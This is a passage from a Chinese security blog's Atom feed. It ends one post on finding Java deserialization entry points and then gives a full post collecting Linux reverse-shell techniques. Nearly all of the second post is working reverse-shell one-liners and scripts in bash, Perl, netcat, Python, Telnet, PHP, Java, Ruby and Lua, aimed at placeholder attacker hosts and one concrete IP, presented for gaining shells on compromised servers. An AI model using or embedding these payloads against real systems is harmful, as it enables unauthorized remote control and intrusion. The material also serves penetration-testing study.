OpenNMS等java应用都曾受过该漏洞影响。Apache Commons Collections这样的基础库非常多的Java应用都在用，一旦编程人员误用了反序列化这一机制，使得用户输入可以直接被反序列化，就能导致任意代码执行，这是一个极其严重的问题，WebLogic等存在此问题的应用可能只是冰山一角。</li><li>首先拿到一个漏洞应用，需要找到一个接受外部输入的序列化对象的接收点，即反序列化漏洞的触发点。我们可以通过审计源码中对反序列化函数的调用（例如readObject()）来寻找，也可以直接通过对应用交互流量进行抓包，查看流量中是否包含序列化数据来判断，如java序列化数据的特征为以标记（ac ed 00 05）开头。确定了反序列化输入点后，再考察应用的Class Path中是否包含相应的基础库，如Apache Commons Collections库，可通过“grep -R InvokerTransformer .”确认是否包含exp需要的类库（把“InvokerTransformer”删除干净则此漏洞便无法触发）。</li><li><img src="http://p1.bqimg.com/567571/c966099afbe860de.png" alt="image"><br>新版本虽然抓不到端口信息了，但是exp需要的基础类库仍然存在。</li><li>解决方法：可以加入防火墙过滤相应端口的通信。假若反序列化可以设置Java类型的白名单，那么问题的影响就小了很多。使用加密通信，如SSL。</li></ol>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;序列化就是把对象转换成字节流，便于保存在内存、文件、数据库中，也便于进行网络传输；反序列化即逆过程，由字节流还原成对象。&lt;br&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="序列化" scheme="https://michaelwayneliu.github.io/tags/%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>linux反弹shell姿势</title>
    <link href="https://michaelwayneliu.github.io/2017/02/15/first/"/>
    <id>https://michaelwayneliu.github.io/2017/02/15/first/</id>
    <published>2017-02-15T06:59:07.000Z</published>
    <updated>2017-03-06T13:52:54.250Z</updated>
    
    <content type="html"><![CDATA[<p><img src="http://p1.bpimg.com/567571/fd99badf0491cb40.png" alt="image"><br>遇到linux服务器，马上想到反弹shell到本地进行溢出等提权尝试,这里搜集了一些常用的反弹姿势。</p><a id="more"></a><ul><li>首先，选一个未被目标防火墙过滤的TCP端口</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">attacker$ nc -l -v attackerip 4444</span><br></pre></td></tr></table></figure><ul><li><strong>Bash</strong></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/bin/bash -i &gt; /dev/tcp/173.214.173.151/8080 0&lt;&amp;1 2&gt;&amp;1</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/10.0.0.1/8080 0&gt;&amp;1</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0&lt;&amp;196;<span class="built_in">exec</span> 196&lt;&gt;/dev/tcp/attackerip/4444; sh &lt;&amp;196 &gt;&amp;196 2&gt;&amp;196</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1. <span class="built_in">exec</span> 5&lt;&gt;/dev/tcp/attackerip/4444</span><br><span class="line">2. cat &lt;&amp;5 | <span class="keyword">while</span> <span class="built_in">read</span> line; <span class="keyword">do</span> <span class="variable">$line</span> 2&gt;&amp;5 &gt;&amp;5; <span class="keyword">done</span>  <span class="comment"># or:</span></span><br><span class="line"><span class="keyword">while</span> <span class="built_in">read</span> line 0&lt;&amp;5; <span class="keyword">do</span> <span class="variable">$line</span> 2&gt;&amp;5 &gt;&amp;5; <span class="keyword">done</span></span><br></pre></td></tr></table></figure><ul><li><strong>Perl</strong>           </li></ul><p>不依赖于/bin/sh</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">perl -MIO -e <span class="string">'$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"attackerip:4444");STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;'</span></span><br></pre></td></tr></table></figure><p>如果是目标基于windows，还可以</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">perl -MIO -e <span class="string">'$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"attackerip:4444");STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;'</span></span><br></pre></td></tr></table></figure><p>也可上传一个</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#1.pl</span></span><br><span class="line"><span class="keyword">use</span> Socket;</span><br><span class="line">$i=<span class="string">"x.x.x.x"</span>;</span><br><span class="line">$p=<span class="number">8080</span>;</span><br><span class="line"><span class="keyword">socket</span>(S,PF_INET,SOCK_STREAM,<span class="keyword">getprotobyname</span>(<span class="string">"tcp"</span>));</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">connect</span>(S,sockaddr_in($p,inet_aton($i))))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">open</span>(STDIN,<span class="string">"&gt;&amp;S"</span>);</span><br><span class="line">        <span class="keyword">open</span>(STDOUT,<span class="string">"&gt;&amp;S"</span>);</span><br><span class="line">        <span class="keyword">open</span>(STDERR,<span class="string">"&gt;&amp;S"</span>);</span><br><span class="line">        <span class="keyword">exec</span>(<span class="string">"/bin/sh -i"</span>);</span><br><span class="line">            &#125;;</span><br></pre></td></tr></table></figure><ul><li><strong>Netcat</strong>  </li></ul><p>取决于nc的版本，在Linux的大部分发行版中都默认编译了nc，但也许是出于安全考虑，发行版中默认编译的nc往往没有-e选项(没有define一个GAPING_SECURITY_HOLE常量)<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -e /bin/sh attackerip 4444</span><br></pre></td></tr></table></figure></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/bin/sh | nc attackerip 4444</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">如果没有权限使用mkfifo /tmp/backpipe也可以创建一个管道</span><br><span class="line">rm -f /tmp/p; mknod /tmp/p p &amp;&amp; nc attackerip 4444 0/tmp/p</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1. mknod /tmp/backpipe p</span><br><span class="line">2. /bin/sh 0&lt;/tmp/backpipe | nc attackerip listenport 1&gt;/tmp/backpipe</span><br></pre></td></tr></table></figure><ul><li><strong>python</strong></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#1.py</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">s.connect((<span class="string">"x.x.x.x"</span>,<span class="number">8080</span>))</span><br><span class="line">os.dup2(s.fileno(),<span class="number">0</span>)</span><br><span class="line">os.dup2(s.fileno(),<span class="number">1</span>)</span><br><span class="line">os.dup2(s.fileno(),<span class="number">2</span>)</span><br><span class="line">p=subprocess.call([<span class="string">"/bin/sh"</span>,<span class="string">"-i"</span>])</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#2.py</span></span><br><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="keyword">import</span> socket,subprocess</span><br><span class="line"></span><br><span class="line">HOST = <span class="string">'10.16.44.100'</span> <span class="comment"># The remote host</span></span><br><span class="line">PORT = <span class="number">443</span> <span class="comment"># The same port as used by the server</span></span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line"><span class="comment"># connect to attacker machine</span></span><br><span class="line">s.connect((HOST, PORT))</span><br><span class="line"><span class="comment"># send we are connected</span></span><br><span class="line">s.send(<span class="string">'[*] Connection Established!'</span>)</span><br><span class="line"><span class="comment"># start loop</span></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line"><span class="comment"># recieve shell command</span></span><br><span class="line">data = s.recv(<span class="number">1024</span>)</span><br><span class="line"><span class="comment"># if its quit, then break out and close socket</span></span><br><span class="line"><span class="keyword">if</span> data == <span class="string">"quit"</span>: <span class="keyword">break</span></span><br><span class="line"><span class="comment"># do shell command</span></span><br><span class="line">proc = subprocess.Popen(data, shell=<span class="keyword">True</span>, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)</span><br><span class="line"><span class="comment"># read output</span></span><br><span class="line">stdout_value = proc.stdout.read() + proc.stderr.read()</span><br><span class="line"><span class="comment"># send output to attacker</span></span><br><span class="line">s.send(stdout_value)</span><br><span class="line"><span class="comment"># close socket</span></span><br><span class="line">s.close()</span><br></pre></td></tr></table></figure><ul><li><strong>Telnet</strong></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rm -f /tmp/p; mknod /tmp/p p &amp;&amp; telnet attackerip 4444 0/tmp/p</span><br></pre></td></tr></table></figure><p>本地在4445端口监听<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">telnet attackerip 4444 | /bin/bash | telnet attackerip 4445</span><br></pre></td></tr></table></figure></p><ul><li><strong>PHP</strong></li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -r <span class="string">'$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");'</span></span><br></pre></td></tr></table></figure><ul><li><strong>JAVA</strong></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">r = Runtime.getRuntime()</span><br><span class="line">p = r.exec([<span class="string">"/bin/bash"</span>,<span class="string">"-c"</span>,<span class="string">"exec 5&lt;&gt;/dev/tcp/10.0.0.1/2002;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done"</span>] as String[])</span><br><span class="line">p.waitFor()</span><br></pre></td></tr></table></figure><ul><li><strong>Ruby</strong>    </li></ul><p>目标基于linux<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ruby -rsocket -e <span class="string">'exit if fork;c=TCPSocket.new("attackerip","4444");while(cmd=c.gets);IO.popen(cmd,"r")&#123;|io|c.print io.read&#125;end'</span></span><br></pre></td></tr></table></figure></p><p>目标基于windows<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ruby -rsocket -e <span class="string">'c=TCPSocket.new("attackerip","4444");while(cmd=c.gets);IO.popen(cmd,"r")&#123;|io|c.print io.read&#125;end'</span></span><br></pre></td></tr></table></figure></p><ul><li><strong>lua</strong></li></ul><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lua -e <span class="string">"require('socket');require('os');t=socket.tcp();t:connect('10.0.0.1','1234');os.execute('/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3');"</span></span><br></pre></td></tr></table></figure><p>参考链接：<br><a href="https://www.waitalone.cn/linux-shell-rebound-under-way.html" target="_blank" rel="noopener">https://www.waitalone.cn/linux-shell-rebound-under-way.html</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;img src=&quot;http://p1.bpimg.com/567571/fd99badf0491cb40.png&quot; alt=&quot;image&quot;&gt;&lt;br&gt;遇到linux服务器，马上想到反弹shell到本地进行溢出等提权尝试,这里搜集了一些常用的反弹姿势。&lt;/p&gt;
    
    </summary>
    
    
      <category term="反弹shell" scheme="https://michaelwayneliu.github.io/tags/%E5%8F%8D%E5%BC%B9shell/"/>
    
  </entry>
  
</feed>
